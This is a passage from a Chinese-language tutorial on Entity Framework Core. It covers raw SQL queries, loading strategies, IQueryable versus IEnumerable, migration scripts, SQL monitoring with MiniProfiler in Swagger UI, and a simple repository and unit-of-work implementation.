&lt;code&gt;exec sp_executesql N'SELECT TOP(@__p_1) [r].[BlogId], [r].[Rating], [r].[Timestamp], [r].[Url]
FROM (
    select * from Blogs
) AS [r]
ORDER BY [r].[Rating] DESC',N'@__p_1 int',@__p_1=2&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用 Include 包括相关数据&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blogs = _context.Blogs.FromSql($&quot;select * from Blogs&quot;).Include(r =&amp;gt; r.Posts).ToList();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过 SQL Server Profiler 查看 SQL 语句:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SELECT [b].[BlogId], [b].[Rating], [b].[Timestamp], [b].[Url]
FROM (
    select * from Blogs
) AS [b]
ORDER BY [b].[BlogId]

SELECT [b.Posts].[PostId], [b.Posts].[BlogId], [b.Posts].[Content], [b.Posts].[Title]
FROM [Posts] AS [b.Posts]
INNER JOIN (
    SELECT [b0].[BlogId]
    FROM (
        select * from Blogs
    ) AS [b0]
) AS [t] ON [b.Posts].[BlogId] = [t].[BlogId]
ORDER BY [t].[BlogId]&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;18&quot;&gt;
&lt;p&gt;&lt;strong&gt;DbContext.Database.ExecuteSqlCommand()&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ExecuteSqlCommand&lt;/code&gt;方法返回一个整数，表示执行的SQL语句影响的行数。有效的操作是 INSERT、UPDATE 和 DELETE，不能用于返回实体。&lt;/p&gt;
&lt;p&gt;测试一下 INSERT：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int affectRows = _context.Database.ExecuteSqlCommand($&quot;Insert into Blogs([Url],[Rating])Values({blog.Url}, {blog.Rating})&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过 SQL Server Profiler 查看 SQL 语句:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exec sp_executesql N'Insert into Blogs([Url],[Rating])Values(@p0, @p1)',N'@p0 nvarchar(4000),@p1 int',@p0=N'testurl',@p1=3&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;延迟加载和预先加载&quot;&gt;延迟加载和预先加载&lt;/h2&gt;
&lt;p&gt;EF Core 通过在模型中使用导航属性来加载相关实体。 有三种常见模式可用于加载相关数据。&lt;/p&gt;
&lt;ul readability=&quot;6&quot;&gt;&lt;li readability=&quot;10&quot;&gt;
&lt;p&gt;&lt;strong&gt;预先加载&lt;/strong&gt;&lt;br/&gt;表示从数据库中加载相关数据，作为初始查询的一部分。使用 &lt;code&gt;Include&lt;/code&gt;方法实现预加载，使用 &lt;code&gt;ThenInclude&lt;/code&gt; 实现多级预加载。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blogs = _context.Blogs.Include(r =&amp;gt; r.Posts).ToList();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当需要 JSON 序列化 blogs 对象时候，ASP.NET Core 自带的序列化库 Newtonsoft.Json 可能会抛出自引用循环异常。请在 Startup 的 ConfigureServices 方法中配置以下代码解决。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc()
        .AddJsonOptions(options =&amp;gt; options.SerializerSettings.ReferenceLoopHandling = Newtonsoft.Json.ReferenceLoopHandling.Ignore);
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;显式加载&lt;/strong&gt;&lt;br/&gt;表示稍后从数据库中显式加载相关数据。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blog = await _context.Blogs.FindAsync(id);

_context.Entry(blog)
    .Collection(b =&amp;gt; b.Posts)
    .Load();&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;延迟加载&lt;/strong&gt;&lt;br/&gt;表示在访问导航属性时，才从数据库中加载相关数据。在 EF Core 2.1 中才引入此功能。
&lt;ol readability=&quot;5&quot;&gt;&lt;li&gt;Nuget 安装 Microsoft.EntityFrameworkCore.Proxies&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;调用 UseLazyLoadingProxies 来启用延迟加载。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;services.AddDbContext&amp;lt;BloggingContext&amp;gt;(option =&amp;gt; option.UseLazyLoadingProxies().UseSqlServer(connectionString));&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;导航属性添加 &lt;code&gt;virtual&lt;/code&gt; 修饰符。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class Blog
{
    public int BlogId { get; set; }
    public string Url { get; set; }
    public int Rating { get; set; }

    public virtual IList&amp;lt;Post&amp;gt; Posts { get; set; }
}

public class Post
{
    public int PostId { get; set; }
    public string Title { get; set; }
    public string Content { get; set; }

    public int BlogId { get; set; }
    public virtual Blog Blog { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;测试，当代码执行到&lt;code&gt;var posts = blog.Posts&lt;/code&gt;时候，会去数据库里面查询Posts记录。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var blog = await _context.Blogs.FindAsync(id);
var posts = blog.Posts;&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;尽量避免在循环时候使用延迟加载，会导致每次循环都去访问数据库。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;iqueryable-和-ienumerable&quot;&gt;IQueryable 和 IEnumerable&lt;/h2&gt;
&lt;p&gt;直接通过一个实例测试一下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var testIQueryable = _context.Blogs.Where(r =&amp;gt; r.Rating &amp;gt; 10);
var testIEnumerable = _context.Blogs.AsEnumerable().Where(r =&amp;gt; r.Rating &amp;gt; 10);

var testIQueryableList = testIQueryable.ToList();
var testIEnumerableList = testIEnumerable.ToList();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看生产的 SQL 语句&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;IQueryable&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SELECT [r].[BlogId], [r].[Rating], [r].[Timestamp], [r].[Url]
FROM [Blogs] AS [r]
WHERE [r].[Rating] &amp;gt; 10&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;IEnumerable&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;SELECT [b].[BlogId], [b].[Rating], [b].[Timestamp], [b].[Url]
FROM [Blogs] AS [b]&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;IQueryable 是将 Linq 表达式翻译成 T-SQL 语句之后再向 SQL 服务器发送命令.&lt;br/&gt;IEnumerable 是在调用自己的 Linq 方法之前先从 SQL 服务器取到数据并加载到本地内存中。&lt;/p&gt;
&lt;h2 id=&quot;生成迁移-sql-脚本&quot;&gt;生成迁移 SQL 脚本&lt;/h2&gt;
&lt;p&gt;EF Core 将迁移更新到生产环境可以使用 &lt;code&gt;Script-Migration&lt;/code&gt; 命令生成sql脚本，然后到生产数据库执行.&lt;/p&gt;
&lt;p&gt;此命令有几个选项。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;-From &amp;lt;String&amp;gt;&lt;/code&gt; 迁移应是运行该脚本前应用到数据库的最后一个迁移。 如果未应用任何迁移，请指定 0（默认值）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-To &amp;lt;String&amp;gt;&lt;/code&gt; 迁移是运行该脚本后应用到数据库的最后一个迁移。 它默认为项目中的最后一个迁移。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-Idempotent&lt;/code&gt; 此脚本仅会应用尚未应用到数据库的迁移。 如果不确知应用到数据库的最后一个迁移或需要部署到多个可能分别处于不同迁移的数据库，此脚本非常有用。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;待补充...&quot;&gt;待补充...&lt;/h2&gt;

&lt;p&gt;有几种方法可以监视 EF Core 自动生成的 SQL 语句：&lt;/p&gt;
&lt;ul readability=&quot;10.442699321177&quot;&gt;&lt;li&gt;内置日志&lt;/li&gt;
&lt;li&gt;数据库监视工具&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Miniprofiler&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;9.5&quot;&gt;
&lt;p&gt;&lt;strong&gt;内置日志&lt;/strong&gt;： 在调试模式下，EF Core 会使用 ASP.NET Core 的内置日志记录功能把生成的 SQL 语句显示在输出窗口，大概如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Microsoft.EntityFrameworkCore.Database.Command:Information: Executed DbCommand (50ms) [Parameters=[@__get_Item_0='?' (DbType = Int32)], CommandType='Text', CommandTimeout='30']
SELECT TOP(1) [e].[Id], [e].[Rating], [e].[Url]
FROM [Blogs] AS [e]
WHERE [e].[Id] = @__get_Item_0&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;如果想查看敏感数据比如&lt;code&gt;@__get_Item_0='?'&lt;/code&gt;，请在 Context 类的 OnConfiguring 方法里面配置&lt;code&gt;optionsBuilder.EnableSensitiveDataLogging();&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;strong&gt;数据库监视工具&lt;/strong&gt;： 也可以通过数据库的监视工具，比如用于监视 MS SQL 的工具 SQL Server Profiler 查看执行的 SQL 语句，大概如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;exec sp_executesql N'SELECT TOP(1) [e].[Id], [e].[Rating], [e].[Url]
FROM [Blogs] AS [e]
WHERE [e].[Id] = @__get_Item_0',N'@__get_Item_0 int',@__get_Item_0=1&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;2.9812299710056&quot;&gt;
&lt;p&gt;&lt;strong&gt;Miniprofiler&lt;/strong&gt;： &lt;a href=&quot;https://github.com/MiniProfiler/dotnet&quot;&gt;MiniProfiler/dotnet&lt;/a&gt;是一款简单而有效的性能分析的轻量级程序，可以监控页面，也可以监控 EF Core 执行的 SQL 语句。&lt;/p&gt;
&lt;p&gt;MiniProfiler 一般用于 MVC 项目，但也可以结合 Swagger 用于 Web API项目。Swagger 的安装和使用在本篇不做讨论，详细请参考&lt;a href=&quot;https://github.com/domaindrivendev/Swashbuckle.AspNetCore&quot;&gt;Swashbuckle.AspNetCore&lt;/a&gt;。&lt;/p&gt;
&lt;ol readability=&quot;19&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;Nuget 安装 MiniProfiler 引用&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Install-Package MiniProfiler.AspNetCore.Mvc
Install-Package MiniProfiler.EntityFrameworkCore&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;19&quot;&gt;
&lt;p&gt;&lt;strong&gt;修改 SwaggerUI/index.html 页面&lt;/strong&gt;： 在项目下面新建一个文件 SwaggerIndex.html 并复制以下代码，设置编译为 Embedded resource&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;script async=&quot;async&quot; id=&quot;mini-profiler&quot; src=&quot;/profiler/includes.min.js?v=4.0.138+gcc91adf599&quot; data-version=&quot;4.0.138+gcc91adf599&quot; data-path=&quot;/profiler/&quot; data-current-id=&quot;4ec7c742-49d4-4eaf-8281-3c1e0efa748a&quot; data-ids=&quot;&quot; data-position=&quot;Left&quot; data-authorized=&quot;true&quot; data-max-traces=&quot;15&quot; data-toggle-shortcut=&quot;Alt+P&quot; data-trivial-milliseconds=&quot;2.0&quot; data-ignored-duplicate-execute-types=&quot;Open,OpenAsync,Close,CloseAsync&quot;&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;!-- HTML for static distribution bundle build --&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;
    &amp;lt;title&amp;gt;%(DocumentTitle)&amp;lt;/title&amp;gt;
    &amp;lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans:400,700|Source+Code+Pro:300,600|Titillium+Web:400,600,700&quot; rel=&quot;stylesheet&quot;&amp;gt;
    &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./swagger-ui.css&quot;&amp;gt;
    &amp;lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;./favicon-32x32.png&quot; sizes=&quot;32x32&quot; /&amp;gt;
    &amp;lt;link rel=&quot;icon&quot; type=&quot;image/png&quot; href=&quot;./favicon-16x16.png&quot; sizes=&quot;16x16&quot; /&amp;gt;
    &amp;lt;style&amp;gt;
        html {
            box-sizing: border-box;
            overflow: -moz-scrollbars-vertical;
            overflow-y: scroll;
        }

        *,
        *:before,
        *:after {
            box-sizing: inherit;
        }

        body {
            margin: 0;
            background: #fafafa;
        }
    &amp;lt;/style&amp;gt;
    %(HeadContent)
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;

    &amp;lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; style=&quot;position:absolute;width:0;height:0&quot;&amp;gt;
        &amp;lt;defs&amp;gt;
            &amp;lt;symbol viewBox=&quot;0 0 20 20&quot; id=&quot;unlocked&quot;&amp;gt;
                &amp;lt;path d=&quot;M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V6h2v-.801C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8z&quot;&amp;gt;&amp;lt;/path&amp;gt;
            &amp;lt;/symbol&amp;gt;

            &amp;lt;symbol viewBox=&quot;0 0 20 20&quot; id=&quot;locked&quot;&amp;gt;
                &amp;lt;path d=&quot;M15.8 8H14V5.6C14 2.703 12.665 1 10 1 7.334 1 6 2.703 6 5.6V8H4c-.553 0-1 .646-1 1.199V17c0 .549.428 1.139.951 1.307l1.197.387C5.672 18.861 6.55 19 7.1 19h5.8c.549 0 1.428-.139 1.951-.307l1.196-.387c.524-.167.953-.757.953-1.306V9.199C17 8.646 16.352 8 15.8 8zM12 8H8V5.199C8 3.754 8.797 3 10 3c1.203 0 2 .754 2 2.199V8z&quot; /&amp;gt;
            &amp;lt;/symbol&amp;gt;

            &amp;lt;symbol viewBox=&quot;0 0 20 20&quot; id=&quot;close&quot;&amp;gt;
                &amp;lt;path d=&quot;M14.348 14.849c-.469.469-1.229.469-1.697 0L10 11.819l-2.651 3.029c-.469.469-1.229.469-1.697 0-.469-.469-.469-1.229 0-1.697l2.758-3.15-2.759-3.152c-.469-.469-.469-1.228 0-1.697.469-.469 1.228-.469 1.697 0L10 8.183l2.651-3.031c.469-.469 1.228-.469 1.697 0 .469.469.469 1.229 0 1.697l-2.758 3.152 2.758 3.15c.469.469.469 1.229 0 1.698z&quot; /&amp;gt;
            &amp;lt;/symbol&amp;gt;

            &amp;lt;symbol viewBox=&quot;0 0 20 20&quot; id=&quot;large-arrow&quot;&amp;gt;
                &amp;lt;path d=&quot;M13.25 10L6.109 2.58c-.268-.27-.268-.707 0-.979.268-.27.701-.27.969 0l7.83 7.908c.268.271.268.709 0 .979l-7.83 7.908c-.268.271-.701.27-.969 0-.268-.269-.268-.707 0-.979L13.25 10z&quot; /&amp;gt;
            &amp;lt;/symbol&amp;gt;

            &amp;lt;symbol viewBox=&quot;0 0 20 20&quot; id=&quot;large-arrow-down&quot;&amp;gt;
                &amp;lt;path d=&quot;M17.418 6.109c.272-.268.709-.268.979 0s.271.701 0 .969l-7.908 7.83c-.27.268-.707.268-.979 0l-7.908-7.83c-.27-.268-.27-.701 0-.969.271-.268.709-.268.979 0L10 13.25l7.418-7.141z&quot; /&amp;gt;
            &amp;lt;/symbol&amp;gt;


            &amp;lt;symbol viewBox=&quot;0 0 24 24&quot; id=&quot;jump-to&quot;&amp;gt;
                &amp;lt;path d=&quot;M19 7v4H5.83l3.58-3.59L8 6l-6 6 6 6 1.41-1.41L5.83 13H21V7z&quot; /&amp;gt;
            &amp;lt;/symbol&amp;gt;

            &amp;lt;symbol viewBox=&quot;0 0 24 24&quot; id=&quot;expand&quot;&amp;gt;
                &amp;lt;path d=&quot;M10 18h4v-2h-4v2zM3 6v2h18V6H3zm3 7h12v-2H6v2z&quot; /&amp;gt;
            &amp;lt;/symbol&amp;gt;

        &amp;lt;/defs&amp;gt;
    &amp;lt;/svg&amp;gt;

    &amp;lt;div id=&quot;swagger-ui&quot;&amp;gt;&amp;lt;/div&amp;gt;

    &amp;lt;!-- Workaround for https://github.com/swagger-api/swagger-editor/issues/1371 --&amp;gt;
    &amp;lt;script&amp;gt;
        if (window.navigator.userAgent.indexOf(&quot;Edge&quot;) &amp;gt; -1) {
            console.log(&quot;Removing native Edge fetch in favor of swagger-ui's polyfill&quot;)
            window.fetch = undefined;
        }
    &amp;lt;/script&amp;gt;

    &amp;lt;script src=&quot;./swagger-ui-bundle.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script src=&quot;./swagger-ui-standalone-preset.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
    &amp;lt;script&amp;gt;
        window.onload = function () {
            var configObject = JSON.parse('%(ConfigObject)');
            var oauthConfigObject = JSON.parse('%(OAuthConfigObject)');
            // Apply mandatory parameters
            configObject.dom_id = &quot;#swagger-ui&quot;;
            configObject.presets = [SwaggerUIBundle.presets.apis, SwaggerUIStandalonePreset];
            configObject.layout = &quot;StandaloneLayout&quot;;
            // If oauth2RedirectUrl isn't specified, use the built-in default
            if (!configObject.hasOwnProperty(&quot;oauth2RedirectUrl&quot;))
                configObject.oauth2RedirectUrl = window.location.href.replace(&quot;index.html&quot;, &quot;oauth2-redirect.html&quot;);
            // Build a system
            const ui = SwaggerUIBundle(configObject);
            // Apply OAuth config
            ui.initOAuth(oauthConfigObject);
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;  &amp;lt;ItemGroup&amp;gt;
    &amp;lt;EmbeddedResource Include=&quot;SwaggerIndex.html&quot; /&amp;gt;
  &amp;lt;/ItemGroup&amp;gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;13&quot;&gt;
&lt;p&gt;&lt;strong&gt;在 Startup 中配置 MiniProfiler&lt;/strong&gt;： 在 ConfigureServices 里面添加&lt;code&gt;services.AddMiniProfiler().AddEntityFramework()&lt;/code&gt;, 在 Configure 里面添加&lt;code&gt;app.UseMiniProfiler();&lt;/code&gt; 并配置 Swagger 的 IndexStream.&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc().SetCompatibilityVersion(CompatibilityVersion.Version_2_1);

    //Swagger
    services.AddSwaggerGen(options =&amp;gt;
    {
        options.DescribeAllEnumsAsStrings();
        options.SwaggerDoc(&quot;v1&quot;, new Swashbuckle.AspNetCore.Swagger.Info
        {
            Title = &quot;API Docs&quot;,
            Version = &quot;v1&quot;,
        });
    });

    //Profiling
    services.AddMiniProfiler(options =&amp;gt;
        options.RouteBasePath = &quot;/profiler&quot;
    ).AddEntityFramework();
}

// This method gets called by the runtime. Use this method to configure the HTTP request pipeline.
public void Configure(IApplicationBuilder app, IHostingEnvironment env)
{
    if (env.IsDevelopment())
    {
        app.UseDeveloperExceptionPage();

        // profiling, url to see last profile check: http://localhost:56775/profiler/results
        app.UseMiniProfiler();
    }

    app.UseSwagger();

    app.UseSwagger().UseSwaggerUI(c =&amp;gt;
    {
        c.SwaggerEndpoint(&quot;/swagger/v1/swagger.json&quot;, &quot;API V1&quot;);
        // index.html customizable downloadable here: https://github.com/domaindrivendev/Swashbuckle.AspNetCore/blob/master/src/Swashbuckle.AspNetCore.SwaggerUI/index.html
        // this custom html has miniprofiler integration
        c.IndexStream = () =&amp;gt; GetType().GetTypeInfo().Assembly.GetManifestResourceStream(&quot;ORMDemo.EFWithRepository.SwaggerIndex.html&quot;);
    });

    app.UseMvc();
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;运行项目，MiniProfiler 监控页面应该已经出现在 Swagger UI 页面的左上角了。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;仓储模式（Repository）是用来解耦的（通过在数据访问层和业务逻辑层之间创建抽象层）。&lt;br/&gt;但仓储只关注于单一聚合的持久化，而业务用例却常常会涉及多个聚合的更改，为了确保业务用例的一致型，我们需要引入工作单元来管理多个聚合。&lt;/p&gt;
&lt;p&gt;工作单元模式（unit of work）的作用就是在业务用例的操作中跟踪对象的所有更改（增加、删除和更新），并将所有更改的对象保存在其维护的列表中。在业务用例的终点，通过事务，一次性提交所有更改，以确保数据的完整性和有效性。总而言之，UOW协调这些对象的持久化及并发问题。&lt;/p&gt;
&lt;p&gt;在 EF Core 中 DBContext 已经实现了工作单元模式，同时也比较容易更换统一的数据存储介质（通过支持的数据库驱动）。那么还有没有必要在 EF Core 上面再封装一层实现自己的仓储和工作单元呢？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果项目比较简单，业务逻辑并不复杂。特别是在实现一些微服务的时候，每个项目（服务）都只负责一部分小的并且功能内聚的业务。这个时候或许保持代码简单最好，没有必要过度设计。&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;当然，如果项目比较复杂，没有采用微服务架构而是多个模块都在一起的单体架构，可能同时需要多种数据存储介质和途径，用到了多种的数据访问和持久化技术，那么可能就需要好好设计一个适合项目的仓储和工作单元模式了。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下面实现一个简单的仓储和工作单元模式：&lt;/p&gt;
&lt;ul readability=&quot;33.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;定义实体基类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public abstract class BaseEntity&amp;lt;TKey&amp;gt;
{
    public virtual TKey Id { get; set; }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;21&quot;&gt;
&lt;p&gt;&lt;strong&gt;定义仓储基类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public interface IRepository&amp;lt;TDbContext, TEntity, TKey&amp;gt; where TEntity : BaseEntity&amp;lt;TKey&amp;gt; where TDbContext : DbContext
{
    Task&amp;lt;TEntity&amp;gt; GetByKeyAsync(TKey id);

    Task&amp;lt;IList&amp;lt;TEntity&amp;gt;&amp;gt; GetAsync(
        Expression&amp;lt;Func&amp;lt;TEntity, bool&amp;gt;&amp;gt; predicate = null,
        Func&amp;lt;IQueryable&amp;lt;TEntity&amp;gt;, IOrderedQueryable&amp;lt;TEntity&amp;gt;&amp;gt; orderBy = null,
        List&amp;lt;Expression&amp;lt;Func&amp;lt;TEntity, object&amp;gt;&amp;gt;&amp;gt; includes = null);

    Task&amp;lt;TEntity&amp;gt; AddAsync(TEntity entity);

    TEntity Update(TEntity entity);

    void Delete(TKey id);

    void Delete(TEntity entity);
}

public class EFRepository&amp;lt;TDbContext, TEntity, TKey&amp;gt; : IRepository&amp;lt;TDbContext, TEntity, TKey&amp;gt; where TEntity : BaseEntity&amp;lt;TKey&amp;gt; where TDbContext : DbContext
{
    protected readonly TDbContext _context;
    protected readonly DbSet&amp;lt;TEntity&amp;gt; dbSet;

    public EFRepository(TDbContext context)
    {
        this._context = context;
        this.dbSet = context.Set&amp;lt;TEntity&amp;gt;();
    }

    public virtual async Task&amp;lt;TEntity&amp;gt; GetByKeyAsync(TKey id)
    {
        return await dbSet.FindAsync(id);
    }

    public virtual async Task&amp;lt;IList&amp;lt;TEntity&amp;gt;&amp;gt; GetAsync(
        Expression&amp;lt;Func&amp;lt;TEntity, bool&amp;gt;&amp;gt; predicate = null,
        Func&amp;lt;IQueryable&amp;lt;TEntity&amp;gt;, IOrderedQueryable&amp;lt;TEntity&amp;gt;&amp;gt; orderBy = null,
        List&amp;lt;Expression&amp;lt;Func&amp;lt;TEntity, object&amp;gt;&amp;gt;&amp;gt; includes = null)
    {
        IQueryable&amp;lt;TEntity&amp;gt; query = dbSet;

        if (includes != null)
        {
            query = includes.Aggregate(query, (current, include) =&amp;gt; current.Include(include));
        }
        if (orderBy != null)
        {
            query = orderBy(query);
        }
        if (predicate != null)
        {
            query = query.Where(predicate);
        }

        return await query.ToListAsync();
    }

    public virtual async Task&amp;lt;TEntity&amp;gt; AddAsync(TEntity entity)
    {
        var result = await dbSet.AddAsync(entity);
        return result.Entity;
    }

    public virtual TEntity Update(TEntity entity)
    {
        AttachIfNot(entity);
        this._context.Entry(entity).State = EntityState.Modified;
        return entity;
    }

    public virtual void Delete(TKey id)
    {
        TEntity entity = dbSet.Find(id);
        Delete(entity);
    }

    public virtual void Delete(TEntity entity)
    {
        AttachIfNot(entity);
        dbSet.Remove(entity);
    }

    protected virtual void AttachIfNot(TEntity entity)
    {
        if (this._context.Entry(entity).State == EntityState.Detached)
        {
            dbSet.Attach(entity);
        }
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;可以根据需求扩展更多的方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;定义工作单元基类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public interface IUnitOfWork&amp;lt;TDbContext&amp;gt; where TDbContext : DbContext
{
    Task&amp;lt;int&amp;gt; SaveChangesAsync();
}

public class UnitOfWork&amp;lt;TDbContext&amp;gt; : IUnitOfWork&amp;lt;TDbContext&amp;gt; where TDbContext : DbContext
{
    private readonly TDbContext _dbContext;

    public UnitOfWork(TDbContext context)
    {
        _dbContext = context ?? throw new ArgumentNullException(nameof(context));
    }

    public async Task&amp;lt;int&amp;gt; SaveChangesAsync()
    {
        return await _dbContext.SaveChangesAsync();
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;strong&gt;定义 BloggingContext 并定义基于 BloggingContext 的仓储基类和工作单元基类&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class BloggingContext : DbContext
{
    public BloggingContext(DbContextOptions&amp;lt;BloggingContext&amp;gt; options)
        : base(options)
    {
    }

    public DbSet&amp;lt;Blog&amp;gt; Blogs { get; set; }
    public DbSet&amp;lt;Post&amp;gt; Posts { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);

        modelBuilder.ApplyConfiguration(new BlogConfiguration());
        modelBuilder.ApplyConfiguration(new PostConfiguration());
    }
}

public interface IBlogggingRepositoryBase&amp;lt;TEntity, TKey&amp;gt; : IRepository&amp;lt;BloggingContext, TEntity, TKey&amp;gt; where TEntity : BaseEntity&amp;lt;TKey&amp;gt;
{
}

public class BlogggingRepositoryBase&amp;lt;TEntity, TKey&amp;gt; : EFRepository&amp;lt;BloggingContext, TEntity, TKey&amp;gt;, IBlogggingRepositoryBase&amp;lt;TEntity, TKey&amp;gt; where TEntity : BaseEntity&amp;lt;TKey&amp;gt;
{
    public BlogggingRepositoryBase(BloggingContext dbContext) : base(dbContext)
    {
    }
}

public class BloggingUnitOfWork : UnitOfWork&amp;lt;BloggingContext&amp;gt;
{
    public BloggingUnitOfWork(BloggingContext dbContext) : base(dbContext)
    {
    }
}&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;strong&gt;在 Startup 的 ConfigureServices 里面注册相关服务&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public void ConfigureServices(IServiceCollection services)
{
    var connectionString = @&quot;Server=.;Database=BloggingWithRepository;Trusted_Connection=True;&quot;;
    services.AddDbContext&amp;lt;BloggingContext&amp;gt;(option =&amp;gt; option.UseSqlServer(connectionString));
    services.AddScoped&amp;lt;BloggingUnitOfWork&amp;gt;();
    services.AddTransient(typeof(IBlogggingRepositoryBase&amp;lt;,&amp;gt;), typeof(BlogggingRepositoryBase&amp;lt;,&amp;gt;));
}&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这里 BloggingContext 和 UnitOfWork 的生命周期为 Scoped。&lt;/p&gt;
